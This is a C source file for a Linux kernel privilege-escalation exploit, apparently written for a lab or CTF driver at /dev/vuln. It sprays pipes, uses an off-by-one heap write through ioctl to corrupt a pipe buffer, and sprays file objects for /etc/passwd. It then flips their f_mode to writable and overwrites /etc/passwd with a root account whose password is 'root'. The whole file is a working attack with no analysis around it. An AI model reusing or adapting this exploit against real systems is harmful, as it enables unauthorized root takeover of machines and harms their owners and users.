#include <fcntl.h>      // for open, O_RDONLY
#include <sched.h>      // for sched_yield
#include <stdbool.h>    // for true
#include <stdint.h>     // for uint32_t, uintptr_t, uint8_t
#include <stdio.h>      // for puts, printf, perror, size_t, NULL
#include <stdlib.h>     // for exit, EXIT_FAILURE, EXIT_SUCCESS
#include <sys/ioctl.h>  // for ioctl
#include <unistd.h>     // for write, close, pipe, read

#define CMD_ALLOC	0xf000
#define CMD_WRITE	0xf001

#define OBJ_SIZE	0x400

typedef struct {
	size_t size;
	char *data;
} request_t;

#define pipe_spray	0x40
#define passwd_spray	0x20
#define id		0xffff0000

static int pipefd[pipe_spray][2];
static int origin = -1;
static int victim = -1;
static int dev = -1;

static void fatal(const char *err)
{
	perror(err);
	exit(EXIT_FAILURE);
}

static void dev_alloc(void)
{
	request_t req;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_ALLOC, &req);
}

static void dev_write(uintptr_t data, size_t len)
{
	request_t req;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_WRITE, &req);
}

static void heap_fengshui(void)
{
	uint32_t verify = 0x88888888;
	uint8_t zero[OBJ_SIZE] = { 0 };
	int ret;

	while (true) {
		puts("[+] try heap fengshui");
		for (int i = 0; i < pipe_spray / 2; ++i) {
			ret = pipe(pipefd[i]);
			if (ret == -1)
				fatal("[-] pipe");
		}

		sched_yield();
		dev_alloc();

		for (int i = pipe_spray / 2; i < pipe_spray; ++i) {
			ret = pipe(pipefd[i]);
			if (ret == -1)
				fatal("[-] pipe");
		}

		puts("[+] write id and verify to pipe");
		for (int i = 0; i < pipe_spray; ++i) {
			uint32_t data = id + i;
			ret = write(pipefd[i][1], &data, sizeof(data));
			if (ret == -1)
				fatal("[-] write");

			ret = write(pipefd[i][1], &verify, sizeof(verify));
			if (ret == -1)
				fatal("[-] write");

			ret = write(pipefd[i][1], &data, sizeof(data));
			if (ret == -1)
				fatal("[-] write");
		}

		puts("[+] off-by-one pipe->bufs[0].page");
		dev_write((uintptr_t)zero, OBJ_SIZE);

		puts("[+] locate victim pipe");
		for (int i = 0; i < pipe_spray; ++i) {
			uint32_t data;

			printf("[+] try pipefd[%d]\n", i);
			ret = read(pipefd[i][0], &data, sizeof(data));
			if (ret == -1)
				fatal("[-] read");

			if (data != id + i && data >= id &&
			    data < id + pipe_spray) {
				uint32_t v;

				ret = read(pipefd[i][0], &v, sizeof(v));
				if (ret == -1)
					fatal("[-] read");

				if (v != verify)
					continue;

				victim = i;
				origin = data - id;
				printf("[+] victim: %d\n", victim);
				printf("[+] origin: %d\n", origin);
				return;
			}
		}

		if (victim == -1) {
			for (int i = 0; i < pipe_spray; ++i) {
				ret = close(pipefd[i][0]);
				if (ret == -1)
					fatal("[-] close");
				ret = close(pipefd[i][1]);
				if (ret == -1)
					fatal("[-] close");
			}
		}
	}
}

int main(void)
{
	const char payload[] =
		"root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/sh";
	uint32_t f_mode = 0x84f801f;
	int passwd[passwd_spray];
	int ret;

	dev = open("/dev/vuln", O_RDONLY);
	if (dev == -1)
		fatal("[-] open");

	heap_fengshui();

	puts("[+] close origin pipe");
	puts("[+] spray /etc/passwd struct file");
	sched_yield();
	close(pipefd[origin][0]);
	close(pipefd[origin][1]);

	for (int i = 0; i < passwd_spray; ++i)
		passwd[i] = open("/etc/passwd", O_RDONLY);

	puts("[+] overwrite f_mode");
	ret = write(pipefd[victim][1], &f_mode, sizeof(f_mode));
	if (ret == -1)
		fatal("[-] write");

	puts("[+] overwrite /etc/passwd");
	for (int i = 0; i < passwd_spray; ++i) {
		ret = write(passwd[i], payload, sizeof(payload));
		if (ret != -1) {
			puts("get r00t!");
			puts("user: root\npass: root");
			break;
		}
	}

	return EXIT_SUCCESS;
}
